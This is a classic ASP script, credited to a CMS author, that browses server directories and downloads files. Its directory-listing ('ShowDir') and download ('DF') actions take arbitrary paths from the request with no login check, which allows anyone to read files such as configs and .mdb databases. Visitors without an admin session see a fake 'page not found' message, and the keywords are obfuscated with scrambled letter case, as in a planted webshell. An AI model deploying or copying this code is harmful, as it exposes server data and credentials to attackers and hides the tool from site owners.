<%
'************************************************************
'作者：云端 (精通ASP/VB/PHP/JS/Flash，交流合作可联系本人)
'版权：源代码公开，各种用途均可免费使用。 
'创建：2016-01-20
'联系：QQ313801120  交流群35915100(群里已有几百人)    邮箱313801120@qq.com   个人主页 sharembweb.com
'更多帮助，文档，更新　请加群(35915100)或浏览(sharembweb.com)获得
'*                                    Powered By 云端 
'************************************************************
%>
<!--#iNClUDe fILe="Config.Asp"-->
<%
dIM fSO,f,fC,mYFiLE
dIM dEFaULtDIt,nEWdEFaULtFSo,nEWsTReAM
dEFaULtDIt="Scripting.Dictionary"
nEWdEFaULtFSo="Scripting.FileSystemObject"
nEWsTReAM = "Adodb.Stream"
iF eXIsTSoBJeCT("Scripting.Dictionary") = fALsE tHEn	dEFaULtDIt="Scripting.wang198060Dictionary"
iF eXIsTSoBJeCT("Scripting.FileSystemObject") = fALsE tHEn	nEWdEFaULtFSo="Scripting.wang198060FileSystemObject"
iF eXIsTSoBJeCT("Adodb.Stream") = fALsE tHEn	nEWsTReAM="Adodb.wang198060Stream"
sELeCT cASe rEQuESt("Action")
cASe "ShowDir":sHOwDIr()	
cASe "DF":dF()	
cASe eLSe dEFaULt2
eND sELeCT
sUB sHOwDIr()
dIM b,c,d,e,f,g,h,i,j,k,l,m,n,o,p
b=rEQuESt("FileShowType")	
c=rEQuESt("WebPath")	
d=rEQuESt("ShowPhoto")	
cALl hANdLEpATh(c)
h = sHOwROoTFiLE(c)
iF h = "" tHEn cALl eERr(c & "此目录下没有文件")
cALl eCHo(h,c)
e = sPLiT(h,vBCrLF)
fOR f = 0 tO uBOuND(e)
g = e(f)
iF g <> "" tHEn
k = tRIm(lCAsE(rIGhT(g,3)))
p = "|" & k & "|"
iF iNStR(b,p) tHEn
iF k = "asp" oR k = "asa" tHEn
i = i & g & vBCrLF
eLSeIF k = "jpg" oR k = "gif" oR k = "png" tHEn
j = j & g & vBCrLF
eLSe
l = l & g & vBCrLF
eND iF
eND iF
eND iF
nEXt
iF d = 1 tHEn
iF j = "" tHEn cALl eERr("提示","没有图片")
h = j
e = sPLiT(h,vBCrLF)
fOR f = 0 tO uBOuND(e)
g = e(f)
iF g <> "" tHEn	
n = rIGhT(g,lEN(g)-iNStRReV(g,"\"))
o = "<a href=?Action=DF&Path=" & g & ">下载</a>"
m = "<div style=""width:200px;height:120px;float:left;border:1px solid #333333;margin:2px;"">"
m=m & "<img src='" & g & "'><br>" & n & o &  "</div>"
cALl rW(m)
eND iF
nEXt
eLSe
h = i & l & j
e = sPLiT(h,vBCrLF)
fOR f = 0 tO uBOuND(e)
g = e(f)
o = "<a href=?Action=DF&Path=" & g & ">下载</a>"
iF g <> "" tHEn
cALl eCHo(f,g & o)
eND iF
nEXt
eND iF
cALl eCHo("","ss")
eND sUB
sUB dF()
dIM b
b = rEQuESt("Path")
cALl dOWnFIlE(b)
eND sUB
sUB dEFaULt2()
iF sESsIOn("Administrator")="SuperAdmin" tHEn
cALl dEFaULt()
rESpONsE.eND()
eND iF
cALl rW("<title>找不到网页</title>")
cALl rW("<font color=#333333>找不到网页<p>正在查找的网页可能已被删除、重命名或暂时不可用。</font>")
eND sUB
%>
<%
fUNcTIoN rW(a)
rESpONsE.wRItE a & vBCrLF
eND fUNcTIoN
fUNcTIoN eCHo(a,b)
rESpONsE.wRItE "<font color=red>"&a&":</font>"&b&"<br>"
eND fUNcTIoN
fUNcTIoN eERr(a,b)
rESpONsE.wRItE "<font color=green>"&a&"</font>："&b&"<br>":rESpONsE.eND()
eND fUNcTIoN
fUNcTIoN jSMeSSaGE(a, b)
dIM c,d
d = a
iF a <> "" tHEn a = "alert('" & a & "');"
iF b = "-1" tHEn
c = "<script>" & a & "history.back(-1);</script>"
eLSeIF b = "-2" tHEn
c = "<script>" & a & "history.back(-2);</script>"
eLSeIF iNStR(b,"Open=") tHEn
b = rEPlACe(b,"Open=","")
c = "<script>" & a & "window.open('" & b & "');</script>"
eLSeIF b <> "" tHEn
c = "<script>" & a & "location.href='" & b & "';</script>"
eLSeIF b = "" tHEn
iF a = "" tHEn a = "点击返回"
c = "<a href=""javascript:history.back();"">" & d & "</a>"
eND iF
jSMeSSaGE = c
eND fUNcTIoN
fUNcTIoN sHOwROoTFiLE(a)
dIM b,c,d,e
cALl hANdLEpATh(a)
sET b = cREaTEoBJeCT(nEWdEFaULtFSo)
iF nOT b.fOLdEReXIsTS(a) tHEn eXIt fUNcTIoN
sET c = b.gETfOLdER(a)
fOR eACh mYFiLE iN c.fILeS
e = e & mYFiLE & vBCrLF
nEXt
sET c = nOThINg
sET d = nOThINg
sET b = nOThINg
sHOwROoTFiLE = e
eND fUNcTIoN
fUNcTIoN eXIsTSoBJeCT(a)
oN eRRoR rESuME nEXt
sET t=sERvER.cREaTEoBJeCT(a)	
sET t=nOThINg
iF -2147221005 <> eRR tHEn
eXIsTSoBJeCT=tRUe	
eLSe	
eRR.cLEaR
eXIsTSoBJeCT=fALsE
eND iF
eND fUNcTIoN
fUNcTIoN dOWnFIlE(a)
dIM b,c
cALl hANdLEpATh(a)
rESpONsE.cLEaR
sET b = cREaTEoBJeCT(nEWsTReAM)
b.oPEn
b.tYPe = 1
b.lOAdFRoMFiLE a
c=iNStRReV(a,"\")+1
rESpONsE.aDDhEAdER "Content-Disposition", "attachment; filename=" & mID(a,c)
rESpONsE.aDDhEAdER "Content-Length", b.sIZe
rESpONsE.cHArSEt = "UTF-8"
rESpONsE.cONtENtTYpE = "application/octet-stream"
rESpONsE.bINaRYwRItE b.rEAd
rESpONsE.fLUsH
rESpONsE.wRItE("")
b.cLOsE
sET b = nOThINg
eND fUNcTIoN
sUB dEFaULt()
dIM b,c,d
c = sERvER.mAPpATh("./")	
b = "|asp|txt|ini|mdb|jpg|gif|png|"	
%>
<table width="912" border="0" cellpadding="0" cellspacing="1" bgcolor="#999999">
<form action="?Action=ShowDir" method="post" name="form1" target="Html" id="form1">
<tr>
<td width="51" height="24" align="center" bgcolor="#FFFFFF">路径：</td>
<td width="415" bgcolor="#FFFFFF"><input name="WebPath" type="text" id="WebPath" value="<%=c%>" size="50" />
<input type="submit" name="button" id="button" value="提交" /></td>
<td width="347" bgcolor="#FFFFFF">类型
<input name="FileShowType" type="text" id="FileShowType" value="<%=b%>" size="40" /></td>
<td width="94" bgcolor="#FFFFFF"><label for="ShowPhoto"><input name="ShowPhoto" type="checkbox" id="ShowPhoto" value="1"/>
显示图片</label></td>
</tr></form>
</table>
<%
cALl rW("<iframe src='' name='Html' width=100% height=100%" & "></" & "iframe>")
eND sUB
%>

